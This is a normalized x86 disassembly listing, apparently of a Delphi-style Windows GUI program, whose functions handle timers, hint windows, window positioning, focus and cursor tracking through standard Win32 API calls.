cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a13c4
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
push eax
push 0x0
push 0x0
call SetTimer
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] sub_4a11ec
mov eax [ ebp - 0x4 ]
call sub_4a1164
sub_4a13cc
add esp 0xffffffe4
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4a1254
add esp 0x1c
retn
sub_4a13f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov eax [ rw-data ]
call sub_49d570
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov eax [ rw-data ]
call sub_49d55c
movzx edx di
mov ecx [ ebp - 0x4 ]
call sub_472314
inc esi
dec ebx
jne r-xdata
sub_4a143c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_494028
test eax eax
je r-xdata
mov eax ebx
call sub_49fcf8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x170 ]
push eax
call __imp_SendMessageW
mov eax ebx
call sub_49fcf8
push eax
push 0xfffffff2
mov eax [ ebx + 0x170 ]
push eax
call SetClassLongW
jmp r-xdata
push 0x0
xor ecx ecx
mov dx 0xb01d
mov eax ebx
call sub_4a13f4
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call __imp_InvalidateRect
sub_4a14ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_407768
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_4070a8
cmp [ ebx + 0x12a ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458574
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_48cd4c
xor eax eax
push ebp
push sub_4a1531
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
mov edx ebx
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
jmp r-xdata
sub_4a1540
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
cmp [ rw-data ] 0x0
jne r-xdata
push 0xffffffec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x170 ]
push esi
call GetWindowLongW
or eax 0x8000000
push eax
push 0xffffffec
mov eax [ ebp + 0x8 ]
push esi
call SetWindowLongW
sub_4a15e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_49d570
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4a1540
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x1d4 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d55c
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4a1540
pop ecx
jmp r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x1d4 ]
push eax
mov eax ebx
call sub_479ce0
push eax
call IsChild
test eax eax
jne r-xdata
sub_4a1688
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4a16cc
mov eax [ rw-data ]
push eax
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4a18c4
sub_4a16f4
push ebx
push esi
push edi
add esp 0xffffffc4
mov edi ecx
mov ebx edx
mov esi eax
push esi
mov esi edi
lea edi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esp + 0x2c ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx eax [ esp + 0xe ]
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_47085c
lea eax [ esp + 0x34 ]
mov dl 0x1
call sub_46f174
call sub_49e3f0
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_4a18c4
jmp r-xdata
cmp [ edi + 0x89 ] 0x0
jne r-xdata
add esp 0x3c
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x60 ]
je r-xdata
mov eax [ esp + 0x2c ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
movsx eax [ esp + 0x1a ]
mov [ esp + 0x20 ] eax
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_47085c
lea edx [ esp + 0x34 ]
lea eax [ esi + 0x64 ]
call sub_40abd8
xor al 0x1
mov al 0x1
jmp r-xdata
movzx ebx [ esi + 0x58 ]
test bl bl
je r-xdata
test al al
je r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4a18c4
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4a1688
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
movzx ecx bl
mov edx 0xb041
mov eax edi
call sub_472314
test bl bl
je r-xdata
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
lea eax [ esp + 0x4 ]
push eax
call GetCursorPos
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4a1b98
jmp r-xdata
sub_4a1818
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4a16cc
movzx eax [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4a1b98
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4a1850
jmp r-xdata
sub_4a1850
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_479ce0
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0xfc ]
test al al
je r-xdata
mov cl 0x1
mov edx [ ebx + 0x74 ]
mov eax ebx
call sub_4a1688
push 0x0
mov eax [ ebx + 0x84 ]
call sub_479ce0
push eax
call ShowWindow
xor edx edx
mov eax [ ebx + 0x84 ]
call sub_470d70
jmp r-xdata
sub_4a18c4
push ebx
mov ebx eax
push 0x0
lea eax [ ebx + 0x60 ]
push eax
call InterlockedExchange
test eax eax
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4a1850
mov [ ebx + 0x58 ] 0x0
call sub_49e578
mov eax ebx
call sub_4a16cc
sub_4a1900
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4a1a44
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_44f190
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4041ec
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4a1a15
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_44f24c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a1a1c
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404220
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4a18f0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4a18f0
mov [ ebp - 0x4 ] eax
sub_4a1a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4a1a58
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x84 ]
test edx edx
jne r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax edx
mov eax [ eax ]
mov esi eax
cmp ebx esi
setne al
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax edx
call sub_4055f0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
test al al
je r-xdata
sub_4a1ab8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_4a1b66
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a1b6d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov edx r-xdata
movzx eax [ ebx ]
call sub_410ccc
test al al
je r-xdata
mov eax ebx
call sub_417924
mov ebx eax
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4071e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
call sub_44cfbc
mov edi eax
cmp edi [ ebp - 0x8 ]
jle r-xdata
adc ecx 0x0
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] edi
cmp [ ebx ] 0xa
jne r-xdata
add ebx 0x2
add ebx 0x2
sub_4a1b98
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_407d18
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4a1f37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4a18c4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4a1688
jmp r-xdata
mov eax [ ebx ]
movzx eax [ eax + 0xd2 ]
call sub_494410
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a1f3e
lea eax [ ebp - 0x90 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_407df0
retn
lea eax [ ebp - 0x4c ]
mov dl 0x1
call sub_46f174
call sub_49e3f0
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_472370
test eax eax
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
call sub_4a1900
add [ ebp - 0x38 ] eax
mov eax [ rw-data ]
call sub_49d4f0
mov [ ebp - 0x34 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4706f0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
xor eax eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x58 ]
sub ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
call sub_40ac74
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_470990
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_49e3b8
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_46d7a4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0xc ]
call sub_4070fc
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_472314
test eax eax
sete [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x0
je r-xdata
cmp [ esi + 0x1d4 ] 0x0
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x162 ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ esi + 0x1d4 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5d ]
lea edx [ ebp - 0xc ]
mov esi [ ebx ]
mov eax [ esi + 0x164 ]
call [ esi + 0x160 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x40 ]
call sub_4a1a58
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
movzx edx [ eax + 0x61 ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov esi [ eax ]
call [ esi + 0x104 ]
lea eax [ ebp - 0x70 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x3c ]
call sub_40ac74
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc7
call sub_40587c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_47085c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_47085c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x30 ]
call sub_470fdc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0x100 ]
call sub_49e504
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0xc ]
call sub_4a1ab8
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_4a1688
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4a1688
jmp r-xdata
sub_4a1f48
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0xcc ]
call sub_408754
cmp ebx eax
jl r-xdata
lea edi [ ebx + ebx * 2 ]
mov eax [ esi + 0xcc ]
cmp ebp [ eax + edi * 4 + 0x4 ]
jne r-xdata
mov eax [ esi + 0xc8 ]
mov [ esp ] eax
inc [ esi + 0xc8 ]
mov eax [ esi + 0xcc ]
call sub_408754
cmp ebx eax
jl r-xdata
mov eax [ esi + 0xcc ]
cmp [ eax + edi * 4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xcc ]
mov eax [ eax + edi * 4 ]
mov [ esp ] eax
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0xcc ]
mov ecx [ esp ]
mov [ edx + eax * 4 ] ecx
mov edx [ esi + 0xcc ]
mov [ edx + eax * 4 + 0x4 ] ebp
mov edx [ esi + 0xcc ]
cmp [ ebp + 0x35c ] 0x0
setne cl
mov [ edx + eax * 4 + 0x8 ] cl
mov eax [ esi + 0xcc ]
call sub_408754
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
lea eax [ esi + 0xcc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
inc ebx
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4a2010
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x64 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_4070a8
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x2a8 ]
call sub_4070a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4a2074
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov [ ebx + 0xb8 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x170 ]
push eax
call __imp_SendMessageW
sub_4a20a0
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
cmp [ esp ] 0x0
jne r-xdata
call GetActiveWindow
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ ebx + 0x170 ]
push eax
call GetLastActivePopup
mov [ esp ] eax
sub_4a20ec
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0x102 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_479ce0
mov [ esp ] eax
sub_4a212c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x64 ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_472314
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_472314
dec eax
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_48cb60
sub_4a21c4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4a21ec
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xea ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4a22bc
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebx ebx
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax ebp
call sub_46d414
mov esi eax
test esi esi
jne r-xdata
cmp ebp [ eax + 0x37c ]
jne r-xdata
test esi esi
je r-xdata
push ebp
call GetParent
mov ebp eax
test ebp ebp
je r-xdata
mov esi eax
jmp r-xdata
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40587c
mov ebx eax
mov eax ebp
call sub_46d414
mov esi eax
test esi esi
je r-xdata
sub_4a2328
push ebx
push esi
mov ebx eax
mov [ ebx + 0x34 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
mov esi [ ebx + 0x44 ]
cmp eax esi
je r-xdata
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
mov eax ebx
call sub_49f09c
mov dl 0x1
mov eax ebx
call sub_49f1fc
mov eax [ rw-data ]
mov esi [ eax + 0x60 ]
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ ebx + 0x152 ] 0x0
je r-xdata
mov eax esi
call sub_479ce0
push eax
call SetFocus
cmp [ esi + 0x29e ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
mov eax esi
call sub_479ce0
mov edx 0x9
call sub_49e650
sub_4a23b0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp bl [ esi + 0xd3 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esi + 0xd3 ] bl
mov edi [ esi + 0x44 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
mov eax edi
call sub_47a060
test al al
je r-xdata
push 0xffffffec
mov ebx [ esi + 0x170 ]
push ebx
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebx
call SetWindowLongW
mov eax [ esi + 0x8c ]
call sub_407134
push eax
mov eax [ esi + 0x170 ]
push eax
call SetWindowTextW
push 0xffffffec
mov ebx [ esi + 0x170 ]
push ebx
call GetWindowLongW
or eax 0x80
push eax
push 0xffffffec
push ebx
call SetWindowLongW
push 0x0
mov eax [ esi + 0x170 ]
push eax
call SetWindowTextW
jmp r-xdata
mov eax [ esi + 0x44 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x44 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0x44 ]
call sub_479ce0
mov edi eax
call GetForegroundWindow
cmp edi eax
sete [ esp ]
mov eax [ esi + 0x44 ]
call sub_479ce0
mov edx [ esi + 0x44 ]
movzx ecx [ edx + 0x59 ]
xor edx edx
call sub_4940a8
mov cl 0x1
mov dl 0x1
mov eax [ esi + 0x170 ]
call sub_4940a8
cmp [ esp ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
mov eax [ esi + 0x170 ]
call sub_4940a8
mov eax [ esi + 0x44 ]
call sub_479ce0
mov edx [ esi + 0x44 ]
movzx ecx [ edx + 0x59 ]
mov dl 0x1
call sub_4940a8
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb033
mov eax [ esi + 0x44 ]
call sub_472314
mov eax [ esi + 0x44 ]
call sub_479ce0
push eax
call SetForegroundWindow
sub_4a24f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x10 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x18 ] eax
mov [ edi + 0x28 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4a2548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4312cc
pop esi
pop ebx
retn
mov eax esi
